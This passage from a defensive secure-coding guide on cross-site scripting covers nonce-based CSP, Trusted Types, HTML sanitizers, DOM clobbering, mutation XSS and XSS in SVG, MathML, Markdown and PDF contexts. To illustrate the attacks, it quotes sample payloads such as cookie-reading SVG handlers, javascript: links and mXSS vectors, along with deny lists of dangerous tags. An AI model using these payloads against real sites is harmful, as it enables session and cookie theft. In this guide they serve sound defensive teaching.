  // Generate a unique nonce for each response
  const nonce = crypto.randomBytes(16).toString("base64");
  res.locals.cspNonce = nonce;

  // Set CSP header
  res.setHeader("Content-Security-Policy", [
    `script-src 'nonce-${nonce}' 'strict-dynamic'`,
    "object-src 'none'",
    "base-uri 'none'",
    "frame-ancestors 'self'",
    "require-trusted-types-for 'script'",
  ].join("; "));

  next();
});

app.get("/", (req, res) => {
  const nonce = res.locals.cspNonce;
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <!-- This script executes because it has the correct nonce -->
      <script nonce="${nonce}" src="/js/app.js"></script>

      <!-- Injected scripts do NOT have the nonce, so they are BLOCKED -->
      <!-- <script>alert('XSS')</script> is blocked by CSP -->
    </head>
    <body>
      <h1>Secure Page</h1>
    </body>
    </html>
  `);
});
```

```go
// Go -- Nonce-based CSP middleware
package main

import (
    "crypto/rand"
    "encoding/base64"
    "fmt"
    "net/http"
)

func generateNonce() string {
    b := make([]byte, 16)
    rand.Read(b)
    return base64.StdEncoding.EncodeToString(b)
}

func cspMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        nonce := generateNonce()
        r = r.WithContext(context.WithValue(r.Context(), "csp-nonce", nonce))

        csp := fmt.Sprintf(
            "script-src 'nonce-%s' 'strict-dynamic'; object-src 'none'; base-uri 'none';",
            nonce,
        )
        w.Header().Set("Content-Security-Policy", csp)
        next.ServeHTTP(w, r)
    })
}
```

### 6.2 CSP Directives for XSS Prevention

| Directive | Recommended Value | Purpose |
|-----------|-------------------|---------|
| `script-src` | `'nonce-{RANDOM}' 'strict-dynamic'` | Only nonced scripts execute; `strict-dynamic` allows them to load further scripts |
| `object-src` | `'none'` | Blocks `<object>`, `<embed>`, `<applet>` (Flash-based XSS) |
| `base-uri` | `'none'` or `'self'` | Prevents `<base>` tag injection that changes relative URL resolution |
| `frame-ancestors` | `'self'` | Replaces X-Frame-Options, prevents clickjacking |
| `require-trusted-types-for` | `'script'` | Enforces Trusted Types, blocks string-to-DOM sinks |
| `default-src` | `'self'` | Fallback for all other resource types |

### 6.3 CSP Anti-Patterns

```
# DANGEROUS: 'unsafe-inline' defeats the purpose of CSP
Content-Security-Policy: script-src 'self' 'unsafe-inline';
# Every injected <script> will execute because 'unsafe-inline' allows it

# DANGEROUS: 'unsafe-eval' allows eval(), new Function(), setTimeout(string)
Content-Security-Policy: script-src 'self' 'unsafe-eval';
# DOM XSS via eval() still works

# DANGEROUS: Overly broad allowlist
Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net;
# Attacker hosts malicious script on jsdelivr (any npm package)
# https://cdn.jsdelivr.net/npm/attacker-package/evil.js

# DANGEROUS: Wildcard source
Content-Security-Policy: script-src *;
# Allows scripts from any domain -- no protection at all
```

### 6.4 CSP Reporting

Deploy CSP in report-only mode first, then enforce.

```
# Step 1: Report-only mode (does not block, only reports violations)
Content-Security-Policy-Report-Only:
  script-src 'nonce-abc123' 'strict-dynamic';
  object-src 'none';
  report-uri /csp-report;
  report-to csp-endpoint;

# Step 2: After fixing all violations, switch to enforcement
Content-Security-Policy:
  script-src 'nonce-abc123' 'strict-dynamic';
  object-src 'none';
  report-uri /csp-report;
```

```typescript
// CSP violation report handler
app.post("/csp-report", express.json({ type: "application/csp-report" }), (req, res) => {
  const report = req.body["csp-report"];
  console.warn("CSP Violation:", {
    documentUri: report["document-uri"],
    violatedDirective: report["violated-directive"],
    blockedUri: report["blocked-uri"],
    sourceFile: report["source-file"],
    lineNumber: report["line-number"],
  });
  res.status(204).end();
});
```

### 6.5 Trusted Types

Trusted Types is a browser API that prevents DOM XSS by requiring that all values passed to dangerous DOM sinks (innerHTML, document.write, eval, etc.) be wrapped in typed objects created by a policy. It is the strongest client-side defense against DOM XSS.

```typescript
// Define a Trusted Types policy
if (window.trustedTypes) {
  const policy = trustedTypes.createPolicy("default", {
    createHTML: (input: string) => {
      // Sanitize the input before allowing it as HTML
      return DOMPurify.sanitize(input);
    },
    createScriptURL: (input: string) => {
      // Only allow scripts from trusted origins
      const url = new URL(input, location.origin);
      if (url.origin === location.origin) {
        return input;
      }
      throw new TypeError("Untrusted script URL: " + input);
    },
    createScript: (input: string) => {
      throw new TypeError("Script creation is not allowed");
    },
  });
}

// With require-trusted-types-for 'script' in CSP:
// element.innerHTML = userInput;  // THROWS TypeError
// element.innerHTML = policy.createHTML(userInput);  // Allowed (sanitized)
```

---

## 7. HTML Sanitization

When an application must accept rich HTML from users (comments with formatting, rich text editors, CMS content), output encoding is not sufficient because it would destroy the formatting. Use a dedicated HTML sanitization library with an allowlist approach.

### 7.1 DOMPurify (JavaScript/TypeScript)

DOMPurify is the most widely used and battle-tested HTML sanitization library for JavaScript.

```typescript
import DOMPurify from "dompurify";

// Basic sanitization -- removes all dangerous tags and attributes
const clean = DOMPurify.sanitize(dirtyHtml);

// Strict allowlist configuration
const clean = DOMPurify.sanitize(dirtyHtml, {
  ALLOWED_TAGS: [
    "h1", "h2", "h3", "h4", "h5", "h6",
    "p", "br", "hr",
    "b", "i", "em", "strong", "u", "s", "strike",
    "ul", "ol", "li",
    "a", "img",
    "blockquote", "pre", "code",
    "table", "thead", "tbody", "tr", "th", "td",
  ],
  ALLOWED_ATTR: ["href", "src", "alt", "title", "class", "target", "rel"],
  ALLOW_DATA_ATTR: false,
  ADD_ATTR: [["target", "_blank"]],  // Force links to open in new tab
  FORBID_TAGS: ["style", "script", "iframe", "form", "input", "object", "embed"],
  FORBID_ATTR: ["onerror", "onload", "onclick", "onmouseover", "style"],

  // Prevent protocol-based attacks
  ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i,
});

// Server-side usage with jsdom
import { JSDOM } from "jsdom";
import createDOMPurify from "dompurify";

const window = new JSDOM("").window;
const DOMPurify = createDOMPurify(window);
const clean = DOMPurify.sanitize(dirtyHtml);
```

### 7.2 sanitize-html (Node.js)

```typescript
import sanitizeHtml from "sanitize-html";

const clean = sanitizeHtml(dirtyHtml, {
  allowedTags: ["b", "i", "em", "strong", "a", "p", "br", "ul", "ol", "li"],
  allowedAttributes: {
    a: ["href", "target", "rel"],
  },
  allowedSchemes: ["https", "http", "mailto"],
  // Strip all tags not in the allowlist (default behavior)
  disallowedTagsMode: "discard",
});
```

### 7.3 Bleach (Python)

```python
import bleach

# Basic sanitization
clean = bleach.clean(
    dirty_html,
    tags=["b", "i", "em", "strong", "a", "p", "br", "ul", "ol", "li"],
    attributes={"a": ["href", "title", "target", "rel"]},
    protocols=["https", "http", "mailto"],
    strip=True,  # Strip disallowed tags instead of escaping them
)

# With link auto-detection
clean = bleach.linkify(bleach.clean(dirty_html))
```

Note: Bleach has been deprecated as of 2023. For new Python projects, consider `nh3` (a Python binding for the Rust-based `ammonia` sanitizer) or `lxml.html.clean` alternatives.

```python
# nh3 -- modern Python HTML sanitizer (Rust-based, fast)
import nh3

clean = nh3.clean(
    dirty_html,
    tags={"b", "i", "em", "strong", "a", "p", "br", "ul", "ol", "li"},
    attributes={"a": {"href", "target", "rel"}},
    url_schemes={"https", "http", "mailto"},
)
```

### 7.4 bluemonday (Go)

```go
import "github.com/microcosm-cc/bluemonday"

// Strict policy -- only allow specific tags
func sanitizeComment(dirty string) string {
    p := bluemonday.NewPolicy()
    p.AllowElements("b", "i", "em", "strong", "a", "p", "br", "ul", "ol", "li")
    p.AllowAttrs("href").OnElements("a")
    p.AllowAttrs("target").Matching(bluemonday.Matching(regexp.MustCompile(`^_blank$`))).OnElements("a")
    p.AllowURLSchemes("https", "http", "mailto")
    p.RequireNoFollowOnLinks(true)
    return p.Sanitize(dirty)
}

// UGC (User Generated Content) preset -- a reasonable default
func sanitizeUGC(dirty string) string {
    p := bluemonday.UGCPolicy()
    return p.Sanitize(dirty)
}

// Strip everything -- plain text only
func stripToText(dirty string) string {
    p := bluemonday.StrictPolicy()
    return p.Sanitize(dirty)
}
```

### 7.5 Java HTML Sanitization

```java
// OWASP Java HTML Sanitizer
import org.owasp.html.PolicyFactory;
import org.owasp.html.Sanitizers;

PolicyFactory policy = Sanitizers.FORMATTING
    .and(Sanitizers.LINKS)
    .and(Sanitizers.BLOCKS)
    .and(Sanitizers.TABLES);

String clean = policy.sanitize(dirtyHtml);

// Custom policy
PolicyFactory customPolicy = new HtmlPolicyBuilder()
    .allowElements("b", "i", "em", "strong", "a", "p", "br", "ul", "ol", "li")
    .allowAttributes("href").onElements("a")
    .allowUrlProtocols("https", "http", "mailto")
    .requireRelNofollowOnLinks()
    .toFactory();

String clean = customPolicy.sanitize(dirtyHtml);
```

### 7.6 Allowlist vs Denylist

**Always use an allowlist approach.** Define the tags and attributes that ARE permitted. Everything else is stripped or escaped.

| Approach | Safety | Reason |
|----------|--------|--------|
| **Allowlist** (permit only known-safe) | High | New attack vectors are blocked by default. Only explicitly allowed elements pass through. |
| **Denylist** (block known-dangerous) | Low | Attackers find tags and attributes you did not block. New HTML elements and event handlers are constantly added to browsers. |

```
DANGEROUS denylist approach:
  Strip <script>, <iframe>, <object>, <embed>, onclick, onerror...
  Attacker uses: <details open ontoggle="alert(1)">
  Attacker uses: <svg><animate onbegin="alert(1)">
  Attacker uses: <math><maction actiontype="statusline">XSS</maction></math>
  -- The denylist does not cover these

SAFE allowlist approach:
  Allow ONLY: b, i, em, strong, a, p, br, ul, ol, li
  All other tags are stripped regardless of what they are
  -- New attack vectors are blocked by default
```

---

## 8. DOM Clobbering

**What it is:** DOM clobbering is a technique where an attacker uses HTML elements with `id` or `name` attributes that collide with JavaScript global variables or DOM API properties. Browsers create named references on `window` and `document` for elements with `id` or `name` attributes. An attacker who can inject HTML (even without scripts) can overwrite variables and properties that the application's JavaScript relies on.

**Impact:** Bypassing security checks, modifying application behavior, escalating to XSS in combination with other vulnerabilities.

### Attack Anatomy

```html
<!-- Application JavaScript expects window.config to be undefined or an object -->
<script>
  // Application code
  const baseUrl = window.config?.baseUrl || "https://safe.com";
  fetch(baseUrl + "/api/data");
</script>

<!-- Attacker injects HTML (via stored XSS or HTML injection) -->
<a id="config" href="https://evil.com">Clobbered</a>

<!-- Now window.config is the <a> element -->
<!-- window.config.baseUrl is undefined, but window.config.toString() returns "https://evil.com" -->
<!-- If the code uses string concatenation, the <a> element's href is used -->

<!-- Nested clobbering for deeper properties -->
<form id="config"><input name="baseUrl" value="https://evil.com"></form>
<!-- window.config.baseUrl is now the <input> element with value "https://evil.com" -->
```

```html
<!-- Clobbering document properties -->
<img name="cookie">
<!-- document.cookie is now the <img> element, not the cookie string -->
<!-- This can break CSRF protection that reads document.cookie -->

<form name="getElementById"></form>
<!-- document.getElementById is now the <form> element -->
<!-- Any code calling document.getElementById() will throw a TypeError -->
```

### Prevention

```typescript
// DEFENSE 1: Use Object.freeze or const declarations that cannot be clobbered
// Variables declared with const/let in modules are not on the window object
const CONFIG = Object.freeze({
  baseUrl: "https://safe.com",
  apiKey: "abc123",
});

// DEFENSE 2: Validate types before using DOM-accessible values
function getConfig(): Config {
  const config = window.config;
  // Check that it is a plain object, not a DOM element
  if (config === null || typeof config !== "object" || config instanceof HTMLElement) {
    return DEFAULT_CONFIG;
  }
  return config as Config;
}

// DEFENSE 3: Use Map or Symbol-keyed properties (not clobberable)
const configMap = new Map<string, string>();
configMap.set("baseUrl", "https://safe.com");
// DOM clobbering cannot affect Map entries

// DEFENSE 4: CSP and HTML sanitization that strips id/name from dangerous elements
// DOMPurify with SANITIZE_DOM option (enabled by default)
const clean = DOMPurify.sanitize(dirty, {
  SANITIZE_DOM: true,  // Removes id/name attributes that clobber DOM properties
});
```

### DOM Clobbering Prevention Rules

1. **Do not rely on global variables** (`window.x`, `document.x`) for security decisions. Use module-scoped constants.
2. **Validate types** when reading properties that might be clobbered. Check that the value is not an `HTMLElement`.
3. **Use DOMPurify with `SANITIZE_DOM: true`** (enabled by default) when sanitizing user-controlled HTML. It removes `id` and `name` attributes that collide with DOM API properties.
4. **Freeze configuration objects** with `Object.freeze()` to prevent modification.
5. **Use Content Security Policy** to restrict inline script execution, limiting the impact of clobbering.

---

## 9. Mutation XSS (mXSS)

**What it is:** Mutation XSS occurs when the browser's HTML parser modifies (mutates) seemingly safe HTML into dangerous HTML during parsing. A sanitizer processes the HTML string and determines it is safe, but when the browser parses and re-serializes the HTML (e.g., via innerHTML), the DOM structure changes in ways that create XSS vectors. The mutation happens because different parts of the browser process HTML differently (the parser, the serializer, and the DOM API can produce different results).

**Why it matters:** mXSS can bypass even well-implemented sanitizers if the sanitizer operates on a different parsing context than the browser. This is one of the most sophisticated XSS attack classes.

### Attack Anatomy

```html
<!-- Example mXSS vector: The sanitizer sees this as safe text inside a <noscript> tag -->
<!-- But the browser's parser treats <noscript> content differently depending on whether -->
<!-- scripting is enabled or disabled -->

<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- Sanitizer's parse (scripting disabled): -->
<!--   <noscript> contains <p title="</noscript>..."> -- safe, it's inside an attribute -->
<!-- Browser's parse (scripting enabled): -->
<!--   <noscript> content is raw text, so </noscript> closes the tag -->
<!--   <img src=x onerror=alert(1)> is parsed as a real element outside noscript -->
<!--   Result: XSS -->

<!-- Another mXSS vector using namespace confusion -->
<svg><desc><![CDATA[</desc><svg onload="alert(1)">]]></desc></svg>

<!-- The parser in SVG context treats CDATA differently than in HTML context -->
<!-- After mutation, the onload handler becomes active -->

<!-- Backtick mutation in older browsers -->
<div title="x`onmouseover=alert(1) ">test</div>
<!-- Some older browser parsers treated backtick as an attribute delimiter -->
```

### Prevention

```typescript
// DEFENSE 1: Use DOMPurify -- it is the most battle-tested sanitizer against mXSS
// DOMPurify parses HTML in the same context the browser will use, preventing mutations
import DOMPurify from "dompurify";

const clean = DOMPurify.sanitize(dirtyHtml);
// DOMPurify uses the browser's own parser, then re-serializes from the DOM
// This ensures the sanitized output matches what the browser will render

// DEFENSE 2: Parse and re-serialize in the same context
// If building a custom sanitizer (not recommended), parse with the browser's DOMParser
// and re-serialize from the DOM tree, never from the original string
function safeSanitize(html: string): string {
  const parser = new DOMParser();
  const doc = parser.parseFromString(html, "text/html");
  // Walk the DOM tree and remove dangerous elements/attributes
  // Then serialize from the DOM (not the original string)
  return doc.body.innerHTML;
}

// DEFENSE 3: Server-side -- use sanitizers that account for mXSS
// In Go, bluemonday renders from a parsed DOM tree
// In Java, OWASP HTML Sanitizer parses then re-serializes
// In Python, nh3 (ammonia) handles mXSS cases
```

### mXSS Prevention Rules

1. **Use DOMPurify** on the client side. It is specifically designed to prevent mXSS by using the browser's own parser.
2. **Never write custom HTML sanitizers** unless you have deep expertise in browser parsing behavior. The HTML specification has dozens of edge cases that create mutation opportunities.
3. **Keep sanitization libraries up to date.** New mXSS vectors are discovered periodically, and library maintainers patch them.
4. **Apply CSP as a defense-in-depth layer.** Even if mXSS bypasses the sanitizer, CSP blocks the script execution.
5. **Avoid parsing HTML in one context and rendering in another.** If the server-side sanitizer parses HTML differently than the browser, mutations can occur.

---

## 10. XSS in Different Contexts

XSS is not limited to standard HTML documents. Any context where user data is interpreted as markup or code is vulnerable.

### 10.1 SVG

SVG supports JavaScript event handlers and can execute scripts. User-uploaded SVG files or SVG content in HTML is a significant XSS vector.

```xml
<!-- XSS via SVG event handlers -->
<svg onload="alert(document.cookie)">
  <circle cx="50" cy="50" r="40"/>
</svg>

<!-- XSS via SVG <script> tag -->
<svg>
  <script>alert(document.cookie)</script>
</svg>

<!-- XSS via SVG <animate> -->
<svg>
  <animate onbegin="alert(1)" attributeName="x" dur="1s"/>
</svg>

<!-- XSS via SVG <set> -->
<svg>
  <set onbegin="alert(1)" attributeName="x" to="1"/>
</svg>

<!-- XSS via SVG foreignObject (embeds HTML inside SVG) -->
<svg>
  <foreignObject>
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(1)</script>
    </body>
  </foreignObject>
</svg>
```

```typescript
// DEFENSE: Sanitize SVG content or serve SVG files with Content-Disposition: attachment
// DOMPurify with SVG support
const cleanSvg = DOMPurify.sanitize(dirtySvg, {
  USE_PROFILES: { svg: true },
  ADD_TAGS: ["svg", "circle", "rect", "line", "path", "polygon", "polyline",
             "ellipse", "g", "text", "tspan", "defs", "use"],
  FORBID_TAGS: ["script", "foreignObject", "animate", "set", "animateTransform"],
  FORBID_ATTR: ["onload", "onbegin", "onend", "onclick", "onerror"],
});

// Serve user-uploaded SVG files from a separate domain (sandbox origin)
// Set Content-Type: image/svg+xml and Content-Security-Policy: script-src 'none'
// Or convert SVG to PNG server-side before serving
```

### 10.2 MathML

MathML can embed HTML via `<maction>` and `<annotation-xml>` elements, creating XSS vectors.

```xml
<!-- XSS via MathML annotation-xml with HTML encoding -->
<math>
  <annotation-xml encoding="text/html">
    <img src=x onerror="alert(1)">
  </annotation-xml>
</math>
```

```typescript
// DEFENSE: Strip MathML from user content unless explicitly required
// If MathML is needed, use a strict allowlist of MathML elements
const clean = DOMPurify.sanitize(dirtyHtml, {
  USE_PROFILES: { mathMl: true },
  // DOMPurify handles MathML namespace correctly
});
```

### 10.3 Markdown Rendering

Markdown renderers that convert to HTML can introduce XSS if they allow raw HTML, `javascript:` links, or do not sanitize the output.

```markdown
<!-- XSS via raw HTML in markdown (if allowed) -->
This is a <script>alert(1)</script> test.

<!-- XSS via javascript: link -->
[Click me](javascript:alert(document.cookie))

<!-- XSS via image with event handler (if raw HTML allowed) -->
<img src=x onerror=alert(1)>

<!-- XSS via data: URI -->
[Click me](data:text/html,<script>alert(1)</script>)
```

```typescript
// DEFENSE: Use a markdown renderer that sanitizes output
import { marked } from "marked";
import DOMPurify from "dompurify";

function renderMarkdown(input: string): string {
  // Step 1: Render markdown to HTML
  const rawHtml = marked.parse(input, {
    // Disable raw HTML passthrough if possible
  });

  // Step 2: Sanitize the rendered HTML
  return DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: [
      "h1", "h2", "h3", "h4", "h5", "h6",
      "p", "br", "hr",
      "b", "i", "em", "strong", "u", "s", "del",
      "ul", "ol", "li",
      "a", "img",
      "blockquote", "pre", "code",
      "table", "thead", "tbody", "tr", "th", "td",
    ],
    ALLOWED_ATTR: ["href", "src", "alt", "title", "class"],
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i,
  });
}
```

### 10.4 Rich Text Editors

Rich text editors (TinyMCE, CKEditor, Quill, ProseMirror, Tiptap) produce HTML output. The editor itself may sanitize on the client side, but server-side sanitization is mandatory because the client-side sanitization can be bypassed.

```typescript
// DEFENSE: Always sanitize on the server, regardless of client-side editor behavior
// The client can be modified -- never trust client-side sanitization alone

// Server-side handler for rich text content
app.post("/api/content", (req, res) => {
  const rawHtml = req.body.content;

  // Step 1: Sanitize with allowlist
  const cleanHtml = DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: ["h1", "h2", "h3", "p", "br", "b", "i", "em", "strong",
                   "ul", "ol", "li", "a", "img", "blockquote", "pre", "code"],
    ALLOWED_ATTR: ["href", "src", "alt", "title"],
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i,
  });

  // Step 2: Store the sanitized HTML
  db.query("INSERT INTO content (html) VALUES ($1)", [cleanHtml]);

  // Step 3: Also sanitize on output (defense in depth)
  res.json({ success: true });
});
```

### 10.5 Email HTML

HTML emails are rendered in email clients that have their own parsing quirks. Some email clients support `<style>` tags, `background` attributes, and other vectors.

```python
# DEFENSE: Sanitize HTML emails with a strict allowlist
import nh3

def sanitize_email_html(dirty_html: str) -> str:
    return nh3.clean(
        dirty_html,
        tags={"p", "br", "b", "i", "em", "strong", "a", "img",
              "table", "tr", "td", "th", "thead", "tbody",
              "h1", "h2", "h3", "h4", "ul", "ol", "li", "div", "span"},
        attributes={
            "a": {"href", "title"},
            "img": {"src", "alt", "width", "height"},
            "td": {"colspan", "rowspan"},
            "th": {"colspan", "rowspan"},
        },
        url_schemes={"https", "http", "mailto"},
        # Strip javascript: and data: URLs
    )
```

### 10.6 PDF Generation

HTML-to-PDF libraries (wkhtmltopdf, Puppeteer, Prince, WeasyPrint) can execute JavaScript if the input HTML contains scripts. If user-controlled data is included in the HTML template, XSS in the PDF generation context can lead to server-side file read or SSRF.

```typescript
// VULNERABLE: User input in HTML-to-PDF template
import puppeteer from "puppeteer";

async function generatePdf(userName: string): Promise<Buffer> {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  // NEVER DO THIS -- userName can contain script tags
  await page.setContent(`<h1>Report for ${userName}</h1>`);
  const pdf = await page.pdf();
  await browser.close();
  return pdf;
}

// SECURE: Encode the data and disable JavaScript
async function generatePdfSecure(userName: string): Promise<Buffer> {
  const browser = await puppeteer.launch({
    args: ["--no-sandbox", "--disable-gpu"],
  });
  const page = await browser.newPage();

  // Disable JavaScript in the page context
  await page.setJavaScriptEnabled(false);

  // HTML-encode the user data
  const safeName = escapeHtml(userName);
  await page.setContent(`<h1>Report for ${safeName}</h1>`);

  const pdf = await page.pdf();
  await browser.close();
  return pdf;
}
```

```go
// Go -- Sanitize HTML before passing to PDF generation
import (
    "github.com/microcosm-cc/bluemonday"
    "html/template"
)

func generateInvoiceHTML(data InvoiceData) string {
    // Use html/template (auto-escaping) for the template
    tmpl := template.Must(template.New("invoice").Parse(`
        <h1>Invoice for {{.CustomerName}}</h1>
        <p>Amount: {{.Amount}}</p>
    `))
    var buf bytes.Buffer
    tmpl.Execute(&buf, data)

    // Additionally sanitize the output
    p := bluemonday.StrictPolicy()
    p.AllowElements("h1", "h2", "p", "table", "tr", "td", "th", "div", "span", "br")
    return p.Sanitize(buf.String())
}
```

---

## Best Practices

### 1. Encode Output for the Correct Context

Apply context-sensitive output encoding every time untrusted data is inserted into HTML, JavaScript, URLs, CSS, or any other interpreted context. Use the encoding function specific to the target context. HTML encoding does not protect in JavaScript context. URL encoding does not protect in HTML context. There is no universal "sanitize" function.

### 2. Rely on Framework Auto-Escaping, Never Disable It

Use a framework that auto-escapes output by default (React, Angular, Vue, Django, Go html/template). Never disable auto-escaping (`dangerouslySetInnerHTML`, `v-html`, `|safe`, `Html.Raw()`, `text/template`) for user-generated content. When you must render rich HTML, sanitize it with DOMPurify or an equivalent library before passing it to the escape hatch.

### 3. Deploy a Strict Content Security Policy

Implement nonce-based CSP with `'strict-dynamic'`. Eliminate `'unsafe-inline'` and `'unsafe-eval'`. Set `object-src 'none'` and `base-uri 'none'`. CSP is the most effective defense-in-depth layer because it blocks script execution even if output encoding fails. Deploy in report-only mode first, then enforce after fixing violations.

### 4. Sanitize Rich HTML with Allowlists, Never Denylists

When accepting rich HTML from users, sanitize with a proven library (DOMPurify, sanitize-html, nh3, bluemonday, OWASP Java HTML Sanitizer). Use an allowlist of permitted tags and attributes. Never use a denylist approach -- new attack vectors will bypass it. Sanitize on the server side even if the client-side editor also sanitizes.

### 5. Eliminate Dangerous DOM Sinks

Never use `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `new Function()`, or `setTimeout`/`setInterval` with string arguments for untrusted data. Use `textContent` for text insertion, `createElement`/`appendChild` for DOM construction, and function references for callbacks. Enable Trusted Types via CSP to enforce this at the browser level.

### 6. Validate and Sanitize URL Schemes

When inserting user-controlled URLs into `href` or `src` attributes, validate the protocol against an allowlist (`https:`, `http:`, `mailto:`). Reject `javascript:`, `data:`, `vbscript:`, and `blob:` schemes. Parse the URL with a proper URL parser, not string matching.

### 7. Set Security Headers

Set the following headers on all responses:
- `Content-Security-Policy` with strict nonce-based policy.
- `X-Content-Type-Options: nosniff` to prevent MIME type sniffing (stops HTML interpretation of non-HTML responses).
- `Content-Type` with explicit charset (e.g., `text/html; charset=UTF-8`) to prevent charset-based XSS.
- `Set-Cookie` with `HttpOnly` flag to prevent JavaScript access to session cookies.
- `Set-Cookie` with `SameSite=Lax` or `SameSite=Strict` to prevent CSRF (related to XSS exploitation chains).

### 8. Isolate User Content on Separate Origins

Serve user-generated content (file uploads, avatars, user HTML) from a separate origin (e.g., `usercontent.example.com` instead of `example.com`). This ensures that XSS in user content cannot access the main application's cookies, localStorage, or same-origin APIs. Google uses `googleusercontent.com` for this purpose.

### 9. Validate postMessage Origins

Always check `event.origin` in `message` event handlers. Never use `*` as the target origin when calling `postMessage()` unless the message contains no sensitive data. Validate the structure and type of `event.data` -- do not trust it blindly.

### 10. Treat All Input Sources as Untrusted

URL parameters, form fields, HTTP headers, cookies, database content, file uploads, API responses from third parties, WebSocket messages, postMessage data, URL fragments, localStorage, sessionStorage -- all are attacker-controllable. Encode or sanitize every source before using it in any sink. Second-order XSS (stored in the database, later rendered without encoding) is as dangerous as first-order XSS.

---

## Anti-Patterns

### 1. Using innerHTML for Dynamic Content

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Setting `element.innerHTML = userData` to display user-provided text | The browser parses the string as HTML and executes any embedded scripts, event handlers, or malicious elements | Use `element.textContent = userData` for text. Use `DOMPurify.sanitize()` before `innerHTML` if HTML formatting is required |

### 2. Disabling Framework Auto-Escaping for User Content

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Using `dangerouslySetInnerHTML`, `v-html`, `{{ var\|safe }}`, `@Html.Raw()`, or `text/template` with user-generated content | The framework's built-in XSS protection is bypassed, user content is rendered as raw HTML | Keep auto-escaping on. If rich HTML is required, sanitize with DOMPurify/bleach/bluemonday before passing to the escape hatch |

### 3. CSP with unsafe-inline

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Setting `script-src 'unsafe-inline'` in CSP to avoid refactoring inline scripts | CSP provides zero XSS protection because any injected inline script will execute | Migrate inline scripts to external files with nonces. Use `'nonce-{RANDOM}' 'strict-dynamic'` instead of `'unsafe-inline'` |

### 4. Denylist-Based HTML Sanitization

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Filtering specific known-dangerous tags (`<script>`, `<iframe>`) while allowing everything else | Attacker uses `<svg onload>`, `<details ontoggle>`, `<math>`, `<marquee onstart>`, `<video onerror>`, or any of hundreds of other elements with event handlers | Use an allowlist approach. Define which tags ARE permitted, strip everything else |

### 5. Encoding for the Wrong Context

| Problem | Consequence | Fix |
|---------|-------------|-----|
| HTML-encoding data inserted into a JavaScript string: `<script>var x = "HTML_ENCODED_DATA";</script>` | HTML encoding does not prevent JavaScript string breakout. `&quot;` is decoded by the HTML parser back to `"` before JavaScript sees it | Use JavaScript-specific encoding (JSON.stringify with additional escaping) or avoid inline scripts entirely. Pass data via data attributes or JSON islands |

### 6. Client-Side-Only Sanitization

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Relying on the rich text editor's client-side sanitization without server-side sanitization | The attacker bypasses the client by sending a crafted HTTP request directly (curl, Postman, browser dev tools) | Always sanitize on the server. Client-side sanitization is for UX (preventing accidental HTML issues), not security |

### 7. Trusting Database Content as Safe

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Rendering database content without encoding because "it was validated on input" | Stored XSS -- if input validation is bypassed, changed, or if data is inserted through a different path (admin tool, migration, API), the stored payload executes | Encode on output, always. Input sanitization is an additional layer, not a substitute for output encoding |

### 8. Allowing javascript: and data: URIs in User Links

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Rendering user-provided URLs in `href` attributes without validating the scheme | `javascript:alert(document.cookie)` executes when clicked. `data:text/html,<script>alert(1)</script>` opens an XSS payload | Validate URL scheme against an allowlist (`https:`, `http:`, `mailto:`). Reject `javascript:`, `data:`, `vbscript:`, `blob:` |

---

## Enforcement Checklist

### Output Encoding (CWE-79)
- [ ] All untrusted data inserted into HTML body context is HTML-entity encoded
- [ ] All untrusted data inserted into HTML attributes is encoded and the attribute is quoted
- [ ] No untrusted data is inserted into event handler attributes (onclick, onerror, onload, etc.)
- [ ] No untrusted data is inserted into `<script>` tags via string concatenation
- [ ] Data passed from server to client uses data attributes or JSON islands, not inline script interpolation
- [ ] URL parameters constructed with user data use `encodeURIComponent()`
- [ ] User-controlled URLs in `href`/`src` are validated for safe schemes (https, http, mailto only)
- [ ] CSS values derived from user input are validated against an allowlist

### Framework Usage
- [ ] Framework auto-escaping is enabled and not bypassed for user content
- [ ] `dangerouslySetInnerHTML` (React) is used only with DOMPurify-sanitized content
- [ ] `v-html` (Vue) is used only with sanitized content
- [ ] `bypassSecurityTrustHtml` (Angular) is never used with user content
- [ ] `|safe` filter (Django/Jinja2) is never used with user content
- [ ] `@Html.Raw()` (ASP.NET) is never used with user content
- [ ] Go templates use `html/template`, never `text/template`, for HTML output

### Content Security Policy
- [ ] CSP header is set on all HTML responses
- [ ] `script-src` uses nonces (`'nonce-{RANDOM}'`) with `'strict-dynamic'`
- [ ] `'unsafe-inline'` is not present in `script-src`
- [ ] `'unsafe-eval'` is not present in `script-src`
- [ ] `object-src` is set to `'none'`
- [ ] `base-uri` is set to `'none'` or `'self'`
- [ ] CSP reporting is configured to detect violations
- [ ] CSP is deployed in report-only mode before enforcement
- [ ] Trusted Types (`require-trusted-types-for 'script'`) are evaluated for enforcement

### HTML Sanitization
- [ ] Rich HTML from users is sanitized with a proven library (DOMPurify, nh3, bluemonday, OWASP Java HTML Sanitizer)
- [ ] Sanitization uses an allowlist approach (not a denylist)
- [ ] Sanitization occurs on the server side (not only the client)
- [ ] Sanitization library is kept up to date
- [ ] Sanitization configuration explicitly lists allowed tags and attributes

### DOM Security
- [ ] `innerHTML` and `outerHTML` are not used with untrusted data
- [ ] `document.write()` and `document.writeln()` are not used
- [ ] `eval()`, `new Function()`, `setTimeout(string)`, `setInterval(string)` are not used
- [ ] `postMessage` handlers validate `event.origin` against an allowlist
- [ ] `postMessage` calls specify the target origin (not `*`) when sending sensitive data
